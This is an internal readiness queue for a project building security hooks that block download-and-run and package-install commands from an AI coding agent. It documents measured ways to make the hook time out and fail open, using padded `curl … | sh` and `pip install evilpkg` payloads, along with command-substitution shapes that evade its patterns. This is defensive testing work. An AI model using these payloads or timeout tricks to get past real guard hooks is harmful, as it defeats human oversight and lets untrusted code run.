# Readiness queue

Worked by `.claude/readiness-runbook.md`. **Internal automation, not protocol
surface.** Ordered by the runbook's §1 rule: **A before B before C — never take
a C item while an A item is ready.**

The goal is not "empty this list". It is to move `docs/production-readiness.md`
§1 off **"not production ready"**. Items are labelled with what they actually
buy.

---

## A — moves the verdict

*(`c1-license` closed 2026-08-14 — PR #75, merge `de13e71`. See Done.)*

*(`sdk-pipe-trigger-redos` closed 2026-08-19 — PR #81, merge `897d427`.
See Done. The two items directly below are the work STRIPPED out of it.)*

- **[blocked] c2-autonomous-dispatch** · `DECISION` · eligible: **no** · **E3 on
  sight** · scope undecidable until the question below is answered
  **THE SECOND OF THE VERDICT'S TWO REMAINING LEGS, AND UNTIL 2026-08-20 IT HAD
  NO WORK ORDER AT ALL** — it is named in `docs/production-readiness.md` §1 and
  in this file's own closing paragraph as a standing blocker, and nothing in any
  tier proposed to do anything about it. **The queue could not reach "production
  ready" no matter how faithfully it was worked.** That gap is the reason this
  row exists.
  **RE-DERIVED ON `main` @ `e3f2f57`, DRIVEN END TO END PAST THE ELIGIBILITY
  GUARDS with a `loop_eligible: true` task under `.claude/specs/s1/tasks/`, a
  stub `claude` first on `PATH`:**
  * `auto.sh` → rc=1, *"Queue runner skeleton installed. Implement the dispatch
    loop per Bootstrap-Protocol-v2-2-0.md Phase 9.7 before any unattended use."*
  * `loop.sh` and `goal-loop.sh` → rc=1, *"No agent work was dispatched."*, both
    naming the call they would make (`claude -p --worktree "wt-T-100"
    --output-format stream-json --verbose`).
  * **No real `claude` invocation was recorded by the stub.** The feature is
    absent, not merely guarded.
  **HALF OF THE RECORDED FINDING IS STALE AND THE STALE HALF IS THE DANGEROUS
  ONE — IT WAS FIXED.** `docs/production-readiness.md`'s C-2 row (measured at
  `e47d827`) says the wrappers *"announce that refusal on stderr while exiting 0
  and recording a terminal-SUCCESS `exit_reason`"*, i.e. under `nohup` or cron a
  skeleton that did nothing was indistinguishable from a clean overnight run.
  **That is no longer true: all three exit 1**, and
  `tests/test_wrapper_behavior.py` pins it as a PROPERTY (*"a wrapper that
  dispatched nothing must not exit 0, and must not record a success code"*).
  **What survives is only "dispatches nothing".** Re-measure before quoting the
  C-2 row; do not copy it.
  **WHY THIS IS A DECISION AND NOT A FIX.** Two resolutions are legitimate and
  they are not the same project:
  **(a) IMPLEMENT the dispatch loop** — per Phase 9.7. Large, security-sensitive
  (it runs `claude -p` unattended in the ADOPTER's tree), and **in direct tension
  with this repo's own trust ramp: R1 is literally *"`/loop` with a fixed prompt
  — unattended iteration on one scoped task"*, and `bin/trust-ramp check --rung
  R1` returns DENIED.** Shipping adopters a capability this project has not
  earned for itself needs to be an explicit choice, not a default.
  **(b) STOP CLAIMING IT** — make the emitted surface and the PRD honest about
  autonomous modes being unimplemented skeletons, and drop them from the
  readiness question. Cheap, and it moves the leg by removing the claim rather
  than by building the feature. **Not covered by `t1-honest-labelling`**, which
  scopes to security promises in `secrets.md` and flat reassurances, not to the
  autonomous-mode claim.
  **THE ONE QUESTION, which is the whole item:** *does the project SHIP
  autonomous dispatch, or does it stop advertising it?* Tier it, size it, or
  close it — a decision, not a fix, exactly as `a6-spec-gate-predicate` is.
  **IF (a) IS CHOSEN, this is what any plan must carry, derived not guessed:**
  `tests/test_wrapper_behavior.py` is deliberately written to SURVIVE a fix — its
  checks assert the property, not the skeleton — **except one**:
  `check("no wrapper dispatched a real `claude` call", not
  os.path.exists(STUB_LOG))`. That single check flips the moment dispatch works,
  and it is the correct place to re-state what "dispatched safely" means. The
  other 64 checks in that file should still pass; if they do not, the fix is
  wrong, not the pins.


- **[ready] prefix-run-language-guard** · `CODE` · eligible: **yes**
  · full ceremony · scope `lib/cmdpos.py`, `tests/test_composition.py`,
  `tests/test_substrate_differential.py`
  **`CODE`, NOT `TEST-CONTRACT`, and the distinction is the runbook's own:**
  bullet 2 below prescribes a predicate change in `lib/cmdpos.py`, and §2 puts
  anything touching `lib/` at full ceremony. Two lenses is the level under which
  these same additions drew six of ten MAJOR/BLOCKER findings.
  **THE THREE THINGS PR #92 PROVED IT NEEDED AND DID NOT SHIP.** Its guards were
  written, reviewed, and STRIPPED at E2 because the round that added them
  diverged (20 → 22 findings, six of the ten MAJOR/BLOCKER ones on the additions
  themselves). They are real; they belong here, where each gets a red row of its
  own instead of riding a fix commit.
  * **The language claim has no in-repo check that can go red.** `prefix_run`'s
    assignment and glued-redirect arms stopped accepting one READING of a token
    on the argument that the wrapper arm already takes it. A step-7 lens mutated
    one call — `not_words(ALL_PREFIXES, _seg)` → `not_words(ALL_PREFIXES +
    ("foo",), _seg)` — emitted a probe, and got `A=1/foo pip install evilpkg`
    deny → **ALLOW** on both substrates while **9,826 of 9,831 checks stayed
    green — exactly 5 move**, and all five are opaque golden digests, which is
    what a freeze exception re-baselines. (A figure of "8,658" circulated during
    the item; it counts a subset of suites and is withdrawn.) The stripped shape was 18 rows at the regex plus a
    calibration applying that exact mutation; **a step-8 lens then showed those
    rows pin ONE substitution, not the class** — of four ordinary narrowings
    tried, **two walked through with both suites green** (`noplus`, dropping
    `[+]?`; and `asgbound`, bounding the assignment run). The other two are
    caught, but only by the FULL differential and not by these rows:
    `redbound` → 4,244/1, `pathbound` → 4,241/4. Any row taken here must cover
    the class, not the one mutation.
  * **`not_words` does class arithmetic on raw word bytes.** `minus()` appends
    word characters straight into a bracket expression and nothing guards
    `words`. Measured on this tree: `time-machine` forms a RANGE and silently
    rejects `timeXy`/`time0y`/`timeAy`/`time_y`/`timeZy`; `time]x` closes the
    class early; `time\\x` makes the pattern uncompilable **in Python** -- bash's
    `regcomp` accepts it and re-parses the group structure instead, because
    in ERE `\\(` is a literal `(`, so the SDK fails at `gates.py` import
    while the shell silently changes what the pattern means. The "returns 2
    and reads as false" consequence belongs to the NULL-ALTERNATIVE hazard,
    not this one. **`isalnum()` IS NOT THE PREDICATE**: it admits non-ASCII, and a
    bracket expression carrying one is locale-dependent in bash and not in
    Python — a lens drove `timç` to `A=1/timé pip install evilpkg` denying under
    `LC_ALL=C.UTF-8` and **ALLOWING under `LC_ALL=C`** on the shell while the
    SDK denied. `_w.isascii() and _w.isalnum()`.
  * **Shell verdict coverage on the changed arms is uncharacterised, and TWO
    attempts to describe it were wrong in OPPOSITE directions** — first "not
    differentiated by this item" (false), then "pinned by the shell control each
    cost row carries" (also false: the control asserts `deny` for every row
    including the `foo` controls, so it is invariant to the arm's reading, and
    `interpreter_word`'s two narrowed scans are reached by no cost payload —
    none contains a `$`, a backtick or an interpreter word). PR #92 ships the
    third attempt, which states only the measurements. Real coverage exists in
    the `differential()` and `_AMB_LANG` rows; **naming it precisely is the
    work**, and it is why this bullet is a row rather than a sentence.

- **[ready] pipe-rule-url-pipe-cubic** · `CODE` · eligible: **yes** · full
  ceremony · **taken 2026-08-23, worked to step 4, CLOSED OUT WITH NO FIX —
  PR #90, merge `36fef02`. The defect STANDS and this row stays in A; only the
  candidate died. Start from the refutation below.**
  **CUBIC, BENIGN-REACHABLE, AND IT CARRIES A DENY — settled by measurement
  2026-08-22 after a step-7 lens reported it `allow` at every size.** The lens
  measured the BARE form only. An ordinary `cat > f.json <<'EOF'` heredoc whose
  values hold `http://…|x` allows; **the same padding with a newline and
  `pip install evilpkg` appended DENIES at the same cost**, on both trees,
  `_cost_guard` PASS at every size:
  ```
     1,095 B   0.034 s DENY      8,445 B  15.247 s DENY
     4,245 B   1.946 s DENY     12,645 B  51.613 s DENY
                                14,745 B  85.559 s DENY
  ```
  Exponents **2.93–3.05**; the deny-carrying form crosses 60 s **between
  12,645 B and 14,745 B** — one fifth the byte count of any other axis.
  Untouched by #84 and #87. **No candidate fix exists.**

  **THE COST IS A PRODUCT OF THREE FACTORS** — downloader starts × pipes
  reachable through `[^;&]*` × the whitespace-free run rescanned per probe.
  Ablating one factor at a time, re-derived 2026-08-23 on an idle box on the
  emitted object: **142×** (`spaced`), **159×** (`onehttp`), **1135×**
  (`onepipe`). Knock out any one and it is quadratic. It is NOT slash
  backtracking — `noslash` stays cubic.
  **THE AXIS IS SDK-ONLY**, both substrates taken in ONE run and quoted per
  payload size, so the pairing means something: 6,345 B shell 1.09 s / SDK
  6.51 s; 8,445 B shell 1.84 s / SDK 15.21 s; 10,545 B shell 2.75 s / SDK
  29.52 s — against the same 60 s ceiling. *(An earlier revision paired a shell
  RANGE against an SDK RANGE whose ends came from different payload sizes, which
  overstated the gap.)*

  **CORRECTION 2026-08-23 — THE PIN THIS ROW USED TO CITE DOES NOT EXIST.** It
  said `{curl u | sh` is pinned at `tests/test_substrate_differential.py:4356`.
  That line is `_AMB_LANG = [`, and was already that at `cb58a23` when the row
  was written; `git grep '{curl'` over the tree returns **no pin** — only prose,
  this row's included. Anchoring the downloader alternation is still refused,
  but on measured merits — see `downloader-arrival-shapes-unpinned`.

  **STEP 4, 2026-08-23 — A THIRD `_cost_guard` TERM BOUNDING THE PRODUCT IS
  REFUTED. NO FIX SHIPPED. READ THIS BEFORE RE-PROPOSING ONE.**
  * **Its bash half DOES pay** — the risk the plan flagged did not materialise.
    A two-pass term (cheap global bound, per-segment pass only on overflow)
    costs **1.6139 s** min-of-7 at 81,916 B on the worst payload forced —
    almost entirely two-byte `|;` segments plus one downloader — against the
    shipped guard's jump term at **0.0872 s** on that same string and a 60 s
    ceiling.
  * **A SPELLING TRAP SITS BESIDE IT.** The downloader count written as a bash
    extglob alternation `${_g//@(curl|wget|…)/}` is **quadratic**, well past
    90 s at 81,920 B — the guard would itself be the DoS. Ten plain substring
    substitutions cost hundredths of a second. Use those.
  * **THE SEGMENTED FORM IS UNSOUND, AND THIS IS THE RESULT THAT HELD.**
    `[^;&]*` cannot cross a `;` or `&`, so scoring the product per `[;&]`
    segment looks like the right instrument. **It is computed on a string the
    regex does not read.** `_redirect_norm` maps `|&` → `|`, and the rule
    searches `_redirect_norm(norm)` among its five derived strings
    (`lib/sdk_gates_template.py:3124-3129`), so writing `|&` for `|` shatters
    the RAW string into 2-byte segments while the copy the regex reads is
    **byte-identical** to the baseline — `_redirect_norm(decoy) == filed` is
    `True`. Measured on the emitted object:
    ```
      n=300   6,645 B  segmented 21   3.295 s
      n=400   8,845 B  segmented 21   7.652 s
      n=600  13,245 B  segmented 21  25.480 s
      n=800  17,645 B  segmented 21  60.191 s   OVER THE 60 s CEILING
    ```
    Exponents 2.95 / 2.98 / 3.00 — still cubic. At 17,645 B the guard PASSES,
    the hook is killed and the command runs unscanned. The general rule is
    filed as `cost-guard-raw-string-soundness`.
  * **THE GLOBAL FORM'S SEPARATION IS UNSETTLED, AND THAT IS THE FINDING.** The
    plan's headline "~667,000×" divided a whole-command attack product by a
    **per-line** benign maximum (6,804 over `git ls-files`, reproduced) — an
    instrument mismatch. **What the real separation is has NOT been established:
    every attempt this session, mine included, scored a different corpus under a
    different predicate and two of them were themselves faulted on review.** No
    number is carried here on purpose. Settling it is
    `benign-corpus-reconciliation`, and it is a precondition for any product
    bound.

  **THE ONE REDUCIBLE FACTOR IS NOT THIS ROW'S.** The unbounded `nonspace*` scan
  belonged to `prefix-run-assignment-wrapper-overlap` — **closed 2026-08-25,
  PR #92 `abe3f48`, see Done; the overlap is removed, so read this paragraph as
  history** — which was then the A-tier row directly
  above. Remove the arm overlap and this axis is linear; a cap bolted on top of a
  cubic moves a crossing, it does not remove one — PR #87's own lesson.

- **[ready] install-tail-path-scan-quadratic** · `CODE` · eligible: **yes**
  **PR #84's OWN FILED PAYLOAD, ON THE SDK.** `{`×81870 + `; pip install
  evilpkg` — 81,891 B, zero jump bytes, guard PASS, deny — routes through
  `_INSTALL_TAIL`, not `_PIPE_TO_SHELL`, and `_INSTALL_TAIL` keeps all **ten** of
  its bare `(?:\S*/)?` path arms. Measured on `main` 2026-08-22: **61.983 /
  62.554 s, already OVER the 60 s ceiling.** **PR #87 closed its SHELL half
  outright — 120.588 → 6.149 s — and nothing else.**

- **[ready] pipe-run-glued-pipe-axis** · `CODE` · eligible: **yes**
  **R4, AND THE FIGURE PREVIOUSLY CARRIED FOR IT WAS LOW BY 2.2–2.6×.**
  `curl http://e/i.sh ` + `|`×n + `pip install evilpkg` at **exactly 81,920 B**
  (`_CMD_MAXLEN`), 0 jump bytes, guard PASS, deny on both trees, MEASURED not
  projected 2026-08-22: **`main` 341.645 s, PR #87's branch 330.457 s** — 5.5–5.7×
  the 60 s ceiling. Earlier records say "~133–152 s"; those are superseded.


- **[ready] jump-bytes-emission-divergence** · `CODE` · eligible: **yes**
  Filed out of `prefix-run-cost-residuals-2` rev 2e E2, where it was dropped as
  a rider rather than taken. **Never measured end to end.**

- **[ready] int-word-clamp-sufficiency** · `TEST-CONTRACT` · eligible: **yes**
  · 2 lenses · scope `tests/` only
  **THE GAP PR #85 CLOSED HALF OF, AND SAID SO.** Both `_int_word` clamp pins —
  the SDK one at `tests/test_issue_fixes.py` and the shell one #85 added — read
  that the clamp is PRESENT, not that it is SUFFICIENT. Append `n = len(base)`
  on the line after the SDK clamp and the reduction is **quadratic again with
  every pinned string byte-identical**, and both pins stay green. Measured
  2026-08-21 on a worktree at `e3f2f57`: that mutation is red ONLY in
  `test_greenfield_golden.py` (10 / 3) — `test_retrofit.py` is 271 / 0, because
  a retrofit plan emits no `gates.py` — and it was previously also caught by the
  `#50 T8` ratio row, at 61.8x, which #85 deleted for being a 1.02x-margin
  clock. **So the surviving backstop is a digest, and a deliberate re-baseline
  carries the mutation through.**
  **DO NOT CLOSE THIS WITH A SOURCE-TEXT PIN.** One was built on `#85`'s branch
  and withdrawn: four spellings defeated it in four attempts — an insertion
  after the clamp, a re-indent of `n -= 1` into the `if` (dead code, the loop
  HANGS), a line hidden in the region the parser discarded, and a second
  `def _int_word` that Python binds instead of the pinned one. **The instrument
  was wrong, not the increment.** A behavioural or cost-shaped check with real
  headroom is the direction, if any is.

- **[ready] x37-class-b** · `CODE` · eligible: **yes** · full ceremony
  · scope `lib/cmdpos.py`, `lib/templates.py`, `lib/sdk_gates_template.py`,
  `tests/test_substrate_differential.py`, `tests/test_composition.py`,
  `tests/test_greenfield_golden.py`, `tests/test_retrofit.py`,
  `docs/deferred-backlog.md`
  **ATTEMPT 1 BUILT AND WITHDRAWN 2026-08-14 — STILL OPEN. Read the X-37 row
  before re-planning; it carries what 100 agents proved.** Branch
  `fix/x37-class-b`, PR #77, NOT merged, kept as evidence. It made 54 rows go
  allow/allow → deny/deny with the fence intact and the suite at 25/9,739/0,
  and the step-7 review still killed it: the rule is ~cubic in
  substitution-opener count, a dimension `_cost_guard` does not bound, so a
  cap-legal `$(`-dense payload crosses the emitted 60 s timeout — and a killed
  hook fails OPEN, turning the approved-list and D20 denies into ALLOWS. A
  larger hole than the one it closed. Second blocker: the body scan `[^)]`
  cannot cross a `)`, so one nested `$()` before the downloader defeated all
  six arms. The two are in TENSION.
  **THE ROW'S OWN INSTRUCTION IS THE THING TO STOP FOLLOWING:** "model it
  beside `cmdpos.pipe_to_shell_regex`" is the wrong architecture. Attempt 2
  should use the walk that already exists — `_cs_subst_scan` / `_subst_inners`
  / `_lift_subs`, bounded by `_SUBST_BUDGET` / `_SUBST_MAXLEN` — to ask which
  substitutions carry a downloader at a command position, plus a CHEAP anchored
  test for whether the substitution sits at an execution position.
  **Scope is wider than this row said** (the four files above were missing, and
  `tests/test_retrofit.py`'s digests go red without it — a step-5 E4 waiting to
  happen). Freeze exception **71 is drafted but UNUSED**; attempt 2 reuses it.
  **Also carried:** `interpreter_word` not `INVOKERS` (or `${SHELL} -c "$(dl)"`
  matches nothing) · the code letter is admissible anywhere in a bundle
  (`bash -cx`) · `bash < <(dl)`, `bash <<< "$(dl)"`, `bash /dev/stdin <<<`,
  `bash 0< <(dl)` are the same channel and absent from this row's shape list ·
  `bash -c -- "$(dl)"` needs a `--`-tolerant run · `ssh host "$(dl)"` denies on
  the merits · **measure cost with `$(`-DENSE padding, not plain text** — plain
  padding is linear and hides this entire class.
  Item 1b / Class B: download-then-run laundered through a command
  substitution (`bash -c "$(curl)"`, `eval`, bare/backtick/process-sub).
  Status cell, derived 2026-08-14: `` `open` — pre-existing, forbidden
  direction, release-relevant; the distinct half of item 1``. §8 holds item 1
  release-blocking until 1b/X-37 **and** B3 land; **B3 has landed**
  (`lib/templates.py:1700`), so this is the survivor and the only A-tier item
  that can be taken without a decision.
  Step 4 = a differential row that is red on the current tree. Freeze
  exception applies. **Never batched.**

## B — makes shipping-with-known-risk honest

- **[ready] shell-walk-residual-superlinear** · `CODE` · eligible: **yes**
  The shell at the 81,919 B length cap is **16.4 s after PR #87**, down from
  131.2 s and no longer past the ceiling — but still superlinear, and bounded
  only because no command may be longer. **PR #87's 2×2 attributes the whole
  win to `_ckey`:** main 134.121 → regex-only 131.429 → ckey-only 16.663 →
  both 16.461 s.
  **[SCOPED 2026-08-26 by `x54-deny-shape`.] "16.4 s / no longer past the ceiling"
  is TRUE FOR THIS SHAPE ONLY — the brace-glue run PR #87 measured (`_ckey`'s
  cost).** A DIFFERENT cap-legal shape still crosses at the cap: the **X-54
  completer/wrapper class** costs **99–167 s** (completer `x`/`i` at the 81,920 B
  length cap, 0 jumps; the `sudo` wrapper at 80,022 B / 4,000 jumps — measured `f4cc8c8`,
  a separate mechanism — the `_cand` in-loop join at `dependency-gate.sh:3954`, not
  `_ckey`). So the length cap is not a single-number ceiling; read this row's figure
  as the brace-glue shape's, and see X-54 for the shape that is still a fail-open.

- **[ready] cost-guard-raw-string-soundness** · `CODE` · eligible: **yes**
  **A SOUNDNESS RULE FOR ANY FUTURE `_cost_guard` TERM, PAID FOR BY A REFUTED
  ONE.** `_cost_guard` is handed `_rc_raw` — the RAW command — but the rules it
  protects search **five derived strings**
  (`lib/sdk_gates_template.py:3124-3129`: `norm`, `_xp_unquote(norm)`,
  `_redirect_norm(norm)`, `_xp_unquote(_rn)` and the parked copy). **A bound
  computed on the raw string is sound only if no derivation can RAISE the
  quantity it bounds.** `_redirect_norm` violates that: it maps `|&` → `|` with
  no space inserted, so a payload can look segmented and cheap raw while the copy
  the regex reads is byte-identical to an expensive one. Demonstrated on the
  emitted object at 17,645 B — **60.191 s, guard PASS, hook killed** — while a
  `[;&]`-segmented product reads 21. **`_xp_unquote` and `_xp_park` are UNSWEPT
  for the same property.** The asymmetry that does hold and is worth keeping: a
  guard that DENIES on exceeding a bound is safe to compute on the raw string; a
  filter that SKIPS on failing a condition is not.
  Filed by `pipe-rule-url-pipe-cubic`, which this killed.

- **[ready] run-length-substrate-whitespace-split** · `CODE` · eligible: **yes**
  **A RUN-LENGTH GUARD TERM CANNOT BE "ONE ENCODING AT ONE SITE" UNTIL THIS IS
  PINNED.** Any term measuring a longest whitespace-free run must split on
  whitespace, and the two substrates disagree on what whitespace is. Measured on
  `a\xc2\xa0b` (U+00A0 between two letters): bash under `local LC_ALL=C` with the
  default IFS sees **one word, maxrun 4**; Python's `str.split()` sees **two
  words, maxrun 1**. Any threshold between 1 and 4 makes the substrates disagree
  on a verdict — the manufactured divergence a parity-justified change exists to
  avoid. Adjacent to X-53's locale/whitespace three-way split.
  Filed by `pipe-rule-url-pipe-cubic`.

- **[ready] downloader-arrival-shapes-unpinned** · `TEST-CONTRACT` · eligible:
  **yes**
  **A NARROWING OF THE DOWNLOADER ALTERNATION WOULD DELETE LIVE DENIES WITH THE
  SUITE GREEN.** This row deliberately carries **no total** — two published
  counts for it were wrong in three days, both inherited rather than derived, so
  what follows is only what was verified on the emitted probe on 2026-08-23 and
  is **not asserted to be exhaustive**. Verify before relying on it.

  *Live deny on both substrates, and `grep` over `tests/` and `lib/` finds no
  pin:* `x=$(curl URL | sh)` · `` x=`curl URL | sh` `` · `{curl URL | sh` ·
  `{ curl URL | sh`.

  *Already pinned — do NOT count these as exposed:* `curl URL | sh` is a deny at
  `tests/test_sdk_gates.py:462` **and** `tests/test_hook_behavior.py:625`;
  `( curl URL | python3 )` is a deny at `tests/test_issue_fixes.py:805` via
  `dep_both(cmd, 2, …)`.

  *A trap that cost two wrong counts:* `x=$(curl -sSL URL)` is pinned at
  `tests/test_substrate_differential.py:3358` as an **allow** — "assignment RHS
  is data". **It has no pipe. It is a different command** from
  `x=$(curl URL | sh)`, which denies. A pin for a similar-looking command is not
  a pin for yours.
  Filed by `pipe-rule-url-pipe-cubic`.

- **[ready] sdk-template-basen-comment** · `EMITTED` · eligible: **yes** · full
  ceremony (a freeze exception is why)
  `lib/sdk_gates_template.py`'s comment that `fullmatch(base[n:])` *"would put
  the O(len^2) straight back"* is **FALSE with the clamp present** — measured
  exponent 0.994 and +1.1% wall. The quadratic returns only WITHOUT the clamp.
  It is a false claim in **emitted bytes**, so correcting it moves a digest and
  needs a freeze exception. Filed by `t8-ratio-bound`, which could not take it:
  a moved digest there would have been E5.

- **[ready] t1-honest-labelling** · `EMITTED` · eligible: **partial**
  · scope `lib/templates.py`, `lib/sdk_gates_template.py`, emitted
  `secrets.md`, `docs/changelog.md`
  Qualify the emitted `secrets.md` promise (timeout/padding bypass); sweep
  emitted templates for flat reassurances — joined-file, case-insensitive, over
  `git ls-files` **and** emitted bodies **and** `gh pr view --json body`.
  The sweep-and-qualify half is eligible; the emit-or-not question is split out
  below. Freeze exception + citation rule apply.

- **[ready] t1-threat-model-emit** · `EMITTED` · eligible: **yes**
  **DECIDED 2026-08-14 by the operator: EMIT it into installs.** Unblocked.
  This fulfils the disclosure half of defer-and-disclose. Costs a freeze
  exception and a golden re-baseline (action counts WILL move — a file is
  added, so §4.1's count check is expected to change here and that is not
  **E5**; say so in the exception). Sequence AFTER `t1-honest-labelling` so the
  emitted text is already honest when it ships.

- **[ready] dw-p4-posture** · `DOC` · eligible: **yes** · batchable with C
  **DECIDED 2026-08-14 by the operator: DW-P4 STAYS ADVISORY — write it down.**
  Record the decision and close the standing question. Two `DOC` follow-ons
  ride along: DW policy §1's grant table still names the inert
  `~/.claude/settings.json` under `CLAUDE_CONFIG_DIR` (re-confirmed
  2026-08-14), and the DW-P4 breach count is stale against the ledger. Note
  honestly that advisory means the logged breach can recur.

- **[blocked] a6-spec-gate-predicate** · `DECISION` · eligible: **no** · T0
  `spec-gate-commit`'s predicate blocks the first code commit of every adopting
  project. Tier it, size it, or close it — a decision, not a fix.

## C — record hygiene · moves the verdict **not at all**

**Batch these.** One branch, one PR, one review, one checkpoint. They are
separate items only because they were discovered separately.

- **[ready] prefix-run-record-layer** · `DOC` · **batch with `x58-table-render`,
  they touch the same rows** · scope `lib/cmdpos.py`, `lib/sdk_gates_template.py`,
  `lib/templates.py`, `tests/test_issue_fixes.py`,
  `docs/agentic-harness-security-kb.md`, `docs/deferred-backlog.md`
  **THE RECORD WORK STRIPPED OUT OF PR #81 AT THE OPERATOR'S DIRECTION AFTER THE
  FIX LOOP DIVERGED (E2, 12 findings → 16).** Every item below is a real defect
  that was verified; they were removed because correcting them in the same PR
  kept introducing NEW false claims, not because they are wrong.
  * **The `#43 F1` cost rationale is falsified by PR #81 and still present
    tense in six places**, two of them shipped bytes: `lib/cmdpos.py`,
    `lib/sdk_gates_template.py` (emitted `gates.py`), `lib/templates.py`
    (emitted `dependency-gate.sh`), `tests/test_issue_fixes.py`. It describes
    `(flag|positional)*` and a two-path assignment that no longer exist.
  * **`lib/sdk_gates_template.py` says "`dependency-gate` is in no timeout
    table"** while the same file sets `"dependency-gate": 60.0`. **It is
    shipped bytes and it negates the mechanism of the fail-open PR #81
    closes.** Highest-value row here.
  * **`docs/agentic-harness-security-kb.md` teaches that "does it match" is
    safe under a greedy unbounded prefix**, including as a `- [ ]` reviewer
    checklist item. Cost makes that false: an arm ambiguous with itself is
    exponential on a FAILING match and the control times out instead of
    answering.
  * **X-58's line citations are stale by exactly +11 in ELEVEN places**, not
    the four anyone has noticed. The seven row citations each land on a REAL
    BUT DIFFERENT row (`:358` is X-32g, not X-36i), which reads as verified.
  * **`prefix_run`'s docstring arm list** describes the pre-2026-08-19
    structure. A minimal correction shipped with the fix; the fuller record
    (why the star was exponential, and that it is INTRA-arm rather than a race
    between arms) did not.
  **DO NOT WRITE A MECHANISM NARRATIVE WITHOUT REBUILDING IT.** The stripped
  version got the mechanism wrong twice — it said three arms raced when only
  ONE arm can even start on the measured payload.


- **[ready] x58-table-render** · `DOC` · scope `docs/deferred-backlog.md`
  Anchors drifted (header :333-334, blanks :360/:397). **Not mechanical** —
  deleting the blanks drops status cells from over-celled rows, which silently
  changes `count.py`'s answer. Validate the rule at 88 before *and* after.
- **[ready] priority-reading** · `DOC` · scope `docs/production-readiness.md`
  Names none of the twelve genuinely blocking rows; Snapshot header still
  `main @ 3c0a2de`, many merges stale.
- **[ready] x49-four-eras** · `DOC` · scope `docs/deferred-backlog.md`,
  `docs/changelog.md`
- **[ready] changelog-citation-anchor** · `TEST-CONTRACT` · **not batched**
  · scope `tests/test_doc_citations.py`, `.claude/dynamic-workflow-policy.md`
  Anchor the changelog citation to a heading instead of a line: it moved three
  times in one session (795 → 851 → 882 → 922; twelfth value, eleventh move).
  Step 4 needs a case proving the old form passed wrongly.

## Measurement residuals

- **[done 2026-08-26] x54-deny-shape** · `MEASUREMENT` · on `f4cc8c8`, emitted
  `dependency-gate.sh` md5 `18aba3cf`. The gap the 2026-08-14 pass left in its own
  claim — same padding but a **would-otherwise-DENY** payload through the emitted
  60 s timeout — is now measured and **execution-proven**. Carrying
  `; pip install evil` (denies unpadded, rc 2), every shape cap-legal and KILLED at
  60 s (rc 124, fail-OPEN), fake-`pip` marker fired: `sudo`+2000 runs (80,022 B /
  4,000 jumps) **167.15 s**; `x`×40,951 (81,920 B / 0 jumps) **104.29 s**; `i`×40,951
  **99.44 s**. The `y`-padded control at the same 81,920 B DENIES in 4.34 s (`f4cc8c8`, idle), pinning the
  cost to the one-character COMPLETER KEYS `i`/`x`, not length. Hot site is a COUPLED O(n²) pair over the growing `_cand`:
  the append `_cand="$_cand $_CJ"` (`:3954`) and the `[[ "$_cand" =~ $HEAD ]]` regex
  (`:3956`) that rescans it each iteration — ablation base 96.0 s → drop either to
  31–48 s → drop both to 4.5 s. A second O(n²) beyond X-52's `_UQW` fix. Full record on the **X-54** backlog row. Harness
  `.claude/checkpoints/x52-harnesses/x54_denyshape_demo.py`. **The X-54 cost class is
  NOT fixed by this — this row only demonstrated the bypass; the CODE fix is still
  open under X-54.**
- **[ready] x55-rerun** · `MEASUREMENT` · eligible: **yes**
  `>240 s KILLED` not re-run; stated as owed in the KB.
- **[ready] benign-corpus-reconciliation** · `MEASUREMENT` · eligible: **yes**
  **"THE BENIGN MAXIMUM" IS NOT A NUMBER YET, AND ONE PREDICATE OVER ONE
  POPULATION IS THE WHOLE JOB.** Every attempt so far — the plan's, mine, and two
  reviewers' — scored a **different corpus** under a **different predicate**, and
  the answers to "does an admissible constant exist" ranged from comfortably yes
  to no. **No figure from those attempts is carried here, because two of them
  were faulted on review and the rest were never reconciled.** What the job needs:
  * ONE predicate, written in both substrates' shipped spellings, **fixed before
    any scoring** — whole-command or per-line, and an exact downloader count
    rather than one that charges `https://` twice;
  * ONE population, with **the guard's own admission conditions applied** — a
    command already denied at `_CMD_MAXLEN`/`_CMD_MAXJUMP` has no headroom to
    lose and must not be scored as benign. Getting this wrong is what produced
    one of the faulted numbers;
  * a **headroom rule fixed before the number is known**, so the constant is not
    chosen from whichever corpus is on the screen;
  * and the property **swept over the population, not read off the top rows of a
    list sorted by a different column** — which is what produced the other.
  Only then is the crossing worth reporting. Filed by `pipe-rule-url-pipe-cubic`;
  it is a precondition for any product-bound guard term.

## External — not ours to take

- **[blocked] sibling-lit07-migrations** · `EXTERNAL` · eligible: **no**
  AgenticRE and hermes-provisioning-refactor carry uncommitted LIT-07
  migrations. A reset there loses them silently. Surface at next contact.

## Residue — do not re-open

Changelog per-item entries for nos. 51–67 (absent by the entry's own words);
the nine historical fail-closed sites (historical record); the PR-attribution
defect (fixed, `fc37aaa`); the `count.py` rule (fixed).

## Done

**`prefix-run-assignment-wrapper-overlap` PR #92 `abe3f48` — the prefix run
stops having two readings of one token.** Closed 2026-08-25. Seven commits:
`8796db1` step-4 reds, `f8745bf` the fix, `e9120eb` the second red, `3c3c11b`
the left edge, then `6aae3ee` / `db46e1b` / `96d046d`, three record commits.
Freeze exception **75**, five golden digests, action counts unchanged at
57 / 69 / 59 and 79 / 93. Suite 9,811 → **9,831**.

**THE ROW NAMED ONE ARM AND THE DEFECT WAS ON TWO.** `A=1/env ` matched the
assignment arm and the path-prefixed wrapper arm at once, so the boundary
between `nonabs*` and the trailing group fell anywhere in a run of them and a
failing match walked every one. **`2>x/env ` did the identical thing on the
GLUED REDIRECT arm** — on no queue row, in no comment, found by a step-3 lens
sweeping the arms instead of reading the one the record names. The one-arm
candidate this item started with measured **14.01 s** on that axis where the
parent measures 14.03 s: a one-character edit to the payload would have undone
the entire repair. Both arms are closed, sharing one copy of the complement;
the SPACED redirect form carries no wrapper reading and is untouched.

**THE LANGUAGE IS UNCHANGED AND DECIDED, NOT SAMPLED** — the exact
ERE/Python → NFA → product-BFS procedure over `prefix_run` **and**
`pipe_to_shell_regex`, both dialects, unbounded in string length, selfchecked on
37,060 / 40,495 / 106,080 strings, two-sided (the opposite repair is caught with
witness `/env `, and that direction is the FAIL-OPEN one: it loses
`"A"=1/env -i pip install evilpkg`, which bash really runs because a quoted NAME
is not an assignment). 370 commands × 7 gates = **2,590 verdicts, 331 deny, zero
differences**.

**MEASURED ON THE EMITTED OBJECT**, min-of-3 `process_time`, `49c402d` → merged:

```
  A=1/env x2700  21,646 B   14.0645 s -> 0.0477 s    exponent 2.0 -> 0.9
  A=1/env x5400  43,246 B   56.0672 s -> 0.0886 s
  2>x/env x2700  21,646 B   14.0314 s -> 0.0485 s
